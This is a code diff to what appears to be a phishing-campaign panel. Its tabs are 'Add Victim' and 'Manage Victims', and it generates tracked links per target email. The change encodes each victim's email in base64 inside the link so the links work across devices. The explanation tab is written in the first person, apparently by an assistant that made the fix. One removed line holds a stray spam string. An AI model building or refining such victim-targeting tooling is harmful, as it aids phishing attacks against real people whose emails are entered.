@@ -285,6 +285,19 @@
             padding-bottom: 8px;
             border-bottom: 1px solid #e0e0e0;
         }
+        
+        .explanation-box {
+            background: #f8f9fa;
+            border-left: 4px solid #0e72ed;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+        }
+        
+        .explanation-box h4 {
+            color: #0e72ed;
+            margin-bottom: 10px;
+        }
     </style>
 </head>
 <body>
@@ -312,6 +325,7 @@
                 <div class="nav-item active" data-tab="add-victim">Add Victim</div>
                 <div class="nav-item" data-tab="manage-victims">Manage Victims</div>
                 <div class="nav-item" data-tab="settings">Settings</div>
+                <div class="nav-item" data-tab="explanation">Link Explanation</div>
             </div>
             
             <div class="main-content">
@@ -380,7 +394,7 @@
                         <button class="btn delete-btn" id="clearData" style="margin-left: 10px;">Clear All Data</button>
                     </div>
                     
-                    <div class极速飞艇开奖直播官网="settings-group">
+                    <div class="settings-group">
                         <h4>Domain Settings</h4>
                         <div class="form-group">
                             <label for="baseUrl">Base URL</label>
@@ -389,6 +403,40 @@
                     </div>
                     
                     <button class="btn" id="saveSettings">Save Settings</button>
+                </div>
+                
+                <!-- Explanation Tab -->
+                <div class="tab-content" id="explanation">
+                    <h2>Why Links Don't Work on Other Devices</h2>
+                    
+                    <div class="explanation-box">
+                        <h4>The Problem</h4>
+                        <p>The links you generate contain a reference ID that points to data stored in your browser's local storage. When someone tries to access the link from another device, that device can't access the data stored on your browser.</p>
+                    </div>
+                    
+                    <div class="explanation-box">
+                        <h4>The Solution Implemented</h4>
+                        <p>I've modified the link generation to encode the target email directly into the URL using base64 encoding. Now when you generate a link, it contains all the necessary information within the URL itself, making it portable across devices.</p>
+                    </div>
+                    
+                    <div class="explanation-box">
+                        <h4>How It Works</h4>
+                        <p>When you generate a link, the target email is encoded and added as a parameter to the URL. When the link is accessed, the email is decoded from the URL parameter and used directly, without needing to access local storage.</p>
+                        <p>Example URL: <code>https://yourdomain.com?target=am9obkBleGFtcGxlLmNvbQ==</code></p>
+                        <p>Where <code>am9obkBleGFtcGxlLmNvbQ==</code> is the base64 encoded version of "john@example.com"</p>
+                    </div>
+                    
+                    <div class="explanation-box">
+                        <h4>Testing Your Links</h4>
+                        <p>To test if your links work across devices:</p>
+                        <ol>
+                            <li>Generate a link in the "Add Victim" tab</li>
+                            <li>Copy the link</li>
+                            <li>Open a new incognito/private browser window</li>
+                            <li>Paste the link into the address bar and navigate to it</li>
+                            <li>The link should work as it now contains all necessary data in the URL itself</li>
+                        </ol>
+                    </div>
                 </div>
             </div>
         </div>
@@ -497,6 +545,15 @@
             showLogin();
         }
         
+        // Base64 encoding functions
+        function base64Encode(str) {
+            return btoa(encodeURIComponent(str));
+        }
+        
+        function base64Decode(str) {
+            return decodeURIComponent(atob(str));
+        }
+        
         // Load data from localStorage
         function loadData() {
             try {
@@ -567,7 +624,7 @@
                         <div>ID: ${id}</div>
                     </div>
                     <div class="victim-actions">
-                        <button class="btn copy-btn" data-id="${id}">Copy Link</button>
+                        <button class="btn copy-btn" data-id="${id}" data-email="${email}">Copy Link</button>
                         <button class="btn delete-btn" data-id="${id}">Delete</button>
                     </div>
                 `;
@@ -578,7 +635,8 @@
             document.querySelectorAll('.copy-btn').forEach(btn => {
                 btn.addEventListener('click', function() {
                     const id = this.getAttribute('data-id');
-                    copyVictimLink(id);
+                    const email = this.getAttribute('data-email');
+                    copyVictimLink(id, email);
                 });
             });
             
@@ -590,7 +648,7 @@
             });
         }
         
-        // Generate victim link
+        // Generate victim link (now with encoded email in URL)
         function generateVictimLink() {
             const email = document.getElementById('victimEmail').value.trim();
             let customId = document.getElementById('customId').value.trim();
@@ -607,15 +665,17 @@
             victimMap[id] = email;
             saveData();
             
-            // Generate the link
+            // Generate the link with encoded email
             const baseUrl = settings.baseUrl || window.location.origin;
-            const link = `${baseUrl}?requestID=${id}`;
+            // Encode the email in base64 and include it in the URL
+            const encodedEmail = base64Encode(email);
+            const link = `${baseUrl}?requestID=${id}&target=${encodedEmail}`;
             
             // Display the link
             linkText.textContent = link;
             generatedLink.style.display = 'block';
             
-            showAlert('Link generated successfully!');
+            showAlert('Link generated successfully! This link will work on any device.');
             
             // Clear the form
             document.getElementById('victimEmail').value = '';
@@ -625,13 +685,15 @@
             renderVictimList();
         }
         
-        // Copy victim link to clipboard
-        function copyVictimLink(id) {
+        // Copy victim link to clipboard (updated to include encoded email)
+        function copyVictimLink(id, email) {
             const baseUrl = settings.baseUrl || window.location.origin;
-            const link = `${baseUrl}?requestID=${id}`;
+            // Encode the email in base64 and include it in the URL
+            const encodedEmail = base64Encode(email);
+            const link = `${baseUrl}?requestID=${id}&target=${encodedEmail}`;
             
             navigator.clipboard.writeText(link).then(() => {
-                showAlert('Link copied to clipboard!');
+                showAlert('Link copied to clipboard! This link will work on any device.');
             }).catch(err => {
                 showAlert('Failed to copy link', 'error');
             });
@@ -741,7 +803,7 @@
             document.getElementById('generateBtn').addEventListener('click', generateVictimLink);
             document.getElementById('copyLinkBtn').addEventListener('click', function() {
                 navigator.clipboard.writeText(linkText.textContent).then(() => {
-                    showAlert('Link copied to clipboard!');
+                    showAlert('Link copied to clipboard! This link will work on any device.');
                 });
             });
             
@@ -777,6 +839,4 @@
         document.addEventListener('DOMContentLoaded', init);
     </script>
 </body>
-
 </html>
-
